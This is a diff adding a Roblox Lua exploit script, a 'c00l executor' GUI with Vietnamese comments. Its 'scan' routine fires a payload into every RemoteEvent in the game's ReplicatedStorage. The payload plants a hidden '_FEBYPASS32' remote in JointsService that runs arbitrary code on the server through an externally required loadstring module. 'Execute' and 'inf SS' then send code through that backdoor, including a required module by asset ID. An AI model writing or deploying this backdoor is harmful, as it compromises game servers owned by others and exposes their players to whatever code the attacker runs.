@@ -1,0 +1,235 @@
+-- Bắt đầu tạo GUI
+local buttonNames = {"Execute", "scan", "inf SS"}
+local scanButton
+
+-- Tạo GUI chính
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "MyExecutorGui"
+ScreenGui.Parent = game.CoreGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 400, 0, 250)
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 1
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+
+-- Tiêu đề
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Parent = MainFrame
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Text = "c00l executor"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 20
+
+-- Ô nhập lệnh
+local box = Instance.new("TextBox")
+box.Name = "CommandBox"
+box.Parent = MainFrame
+box.Size = UDim2.new(1, -20, 0, 120)
+box.Position = UDim2.new(0, 10, 0, 40)
+box.Text = "Execute---"
+box.ClearTextOnFocus = false
+box.TextWrapped = true
+box.TextXAlignment = Enum.TextXAlignment.Left
+box.TextYAlignment = Enum.TextYAlignment.Top
+box.Font = Enum.Font.Code
+box.TextSize = 16
+box.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+box.TextColor3 = Color3.new(1, 1, 1)
+box.BorderColor3 = Color3.fromRGB(255, 0, 0)
+
+function execute(s)
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(tostring(s)) -- execute
+	else
+		warn("Failed to loadstring: Error 404")
+	end
+end
+
+-- Các nút Execute / scan / inf SS
+for i, name in ipairs(buttonNames) do
+    local btn = Instance.new("TextButton")
+    btn.Name = name .. "Button"
+    btn.Parent = MainFrame
+    btn.Size = UDim2.new(0, 120, 0, 30)
+    btn.Position = UDim2.new(0, 10 + (i - 1) * 130, 1, -40)
+    btn.Text = name
+    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.SourceSans
+    btn.BorderColor3 = Color3.fromRGB(255, 0, 0)
+    btn.TextSize = 18
+
+    if name == "scan" then scanButton = btn end
+
+    btn.MouseButton1Click:Connect(function()
+        if name == "Execute" then
+    game.ReplicatedStorage.RemoteEvent:FireServer(box.Text)
+  
+        elseif name == "scan" then
+            local function b_G_V12(see)
+                local a = function(ree)
+                    ree:FireServer([[
+                        local folder = Instance.new('RemoteEvent')
+                        folder.Name = "_FEBYPASS32"
+                        folder.Parent = game:GetService("JointsService")
+                        local loadstring = require(13684410229)
+                        folder.OnServerEvent:Connect(function(_1,_2)
+                           loadstring(_2)()
+                        end)
+                    ]])
+                end
+                for _, v in pairs(see:GetChildren()) do
+                    if v:IsA("RemoteEvent") and not string.match(string.lower(v.Name), "ban") and not string.match(string.lower(v.Name), "kick") then
+                        a(v)
+                    end
+                    b_G_V12(v)
+                end
+            end
+
+            b_G_V12(game:GetService("ReplicatedStorage"))
+
+            local timetoken = 0
+            repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= 2
+
+            if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+                scanButton.Text = "fd :)"
+                
+            else
+                 scanButton.Text = "scanning..."
+                   wait(3)
+                scanButton.Text = "not fd :("
+                wait(2)
+                scanButton.Text = "scan"
+            end
+
+        elseif name == "inf SS" then
+
+            execute('require(7634392335)("' ..game.Players.LocalPlayer.Name .. '")')
+        end
+    end)
+end
+
+-- Nút mở/ẩn GUI trượt
+local square = Instance.new("TextButton")
+square.Size = UDim2.new(0, 100, 0, 100)
+square.Position = UDim2.new(0, 0, 0.1, -50)
+square.AnchorPoint = Vector2.new(0, 0)
+square.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+square.Rotation = 40
+square.Text = "="
+square.Font = Enum.Font.SourceSansBold
+square.TextSize = 36
+square.TextColor3 = Color3.new(1, 1, 1)
+square.ZIndex = 5
+square.BackgroundTransparency = 0.5
+square.Parent = ScreenGui
+
+-- Frame trượt
+local slidingFrame = Instance.new("Frame")
+slidingFrame.Size = UDim2.new(0, 200, 0, 300)
+slidingFrame.Position = UDim2.new(0, -200, 0.5, -150)
+slidingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+slidingFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+slidingFrame.Parent = ScreenGui
+
+-- TweenService
+local TweenService = game:GetService("TweenService")
+local enlarge = TweenService:Create(square, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+    Size = UDim2.new(0, 90, 0, 90)
+})
+local shrink = TweenService:Create(square, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+    Size = UDim2.new(0, 70, 0, 70)
+})
+
+local slideInFrame = TweenService:Create(slidingFrame, TweenInfo.new(0.4), {
+    Position = UDim2.new(0, 0, 0.5, -150)
+})
+local slideOutFrame = TweenService:Create(slidingFrame, TweenInfo.new(0.4), {
+    Position = UDim2.new(0, -200, 0.5, -150)
+})
+
+-- Nút toggle mở/đóng
+local open = false
+square.MouseButton1Click:Connect(function()
+    open = not open
+    if open then
+        slideInFrame:Play()
+        square.Text = "-"
+    else
+        slideOutFrame:Play()
+        square.Text = "="
+    end
+end)
+
+-- Hiệu ứng phóng to / thu nhỏ nút toggle
+task.spawn(function()
+    while true do
+        enlarge:Play()
+        enlarge.Completed:Wait()
+        shrink:Play()
+        shrink.Completed:Wait()
+    end
+end)
+
+-- TextLabel trong sliding frame
+local title2 = Instance.new("TextLabel")
+title2.Name = "cre"
+title2.Parent = slidingFrame
+title2.Size = UDim2.new(1, 0, 0, 30)
+title2.Position = UDim2.new(0, 0, 0.1, 0)
+title2.Text = "cre:"
+title2.TextColor3 = Color3.new(1, 1, 1)
+title2.BackgroundTransparency = 1
+title2.Font = Enum.Font.SourceSansBold
+title2.TextSize = 20
+
+local title20 = Instance.new("TextLabel")
+title20.Name = "lal"
+title20.Parent = slidingFrame
+title20.Size = UDim2.new(1, 0, 0, 30)
+title20.Position = UDim2.new(0, 0, 0.2, 0)
+title20.Text = "scripting by gojohdkaisenkt"
+title20.TextColor3 = Color3.new(1, 1, 1)
+title20.BackgroundTransparency = 1
+title20.Font = Enum.Font.SourceSansBold
+title20.TextSize = 18
+
+local title0 = Instance.new("TextLabel")
+title0.Name = "lal"
+title0.Parent = slidingFrame
+title0.Size = UDim2.new(1, 0, 0, 30)
+title0.Position = UDim2.new(0, 0, 0.25, 0)
+title0.Text = "owner is 1x1x1x1"
+title0.TextColor3 = Color3.new(0, 255, 0)
+title0.BackgroundTransparency = 1
+title0.Font = Enum.Font.SourceSansBold
+title0.TextSize = 20
+title0.BorderColor3 = Color3.new(0, 0, 0)
+
+local squar = Instance.new("TextButton")
+squar.Size = UDim2.new(0, 200, 0, 25)
+squar.Position = UDim2.new(0, 0, 0.35, 0) -- Giữ cố định bên trái, không trượt
+squar.AnchorPoint = Vector2.new(0, 0)
+squar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+squar.Text = "Destroy UI"
+squar.Font = Enum.Font.SourceSansBold
+squar.TextSize = 36
+squar.TextColor3 = Color3.new(1,1,1)
+squar.ZIndex = 5
+squar.BackgroundTransparency = 0
+squar.Parent = slidingFrame
+squar.BorderColor3 = Color3.new(255, 0, 0)
+
+squar.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
